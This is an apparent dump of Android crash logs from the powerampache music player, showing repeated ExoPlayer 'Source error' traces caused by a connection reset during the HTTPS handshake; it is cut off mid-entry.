{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167898739,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167898739,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
qmysk0Ub,2025-07-19T19:38:22.676,powerampache,PHP,Saturday 19th of July 2025 12:38:23 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketException: Connection reset
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)
Caused by: java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:215)
	at java.net.SocketInputStream.read(SocketInputStream.java:144)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:936)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:900)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.access$100(ConscryptEngineSocket.java:722)
	at com.android.org.conscrypt.ConscryptEngineSocket.doHandshake(ConscryptEngineSocket.java:238)
	at com.android.org.conscrypt.ConscryptEngineSocket.startHandshake(ConscryptEngineSocket.java:217)
	at com.android.okhttp.internal.io.RealConnection.connectTls(RealConnection.java:196)
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:153)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:289)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:232)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167895390,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":72},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167895390,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName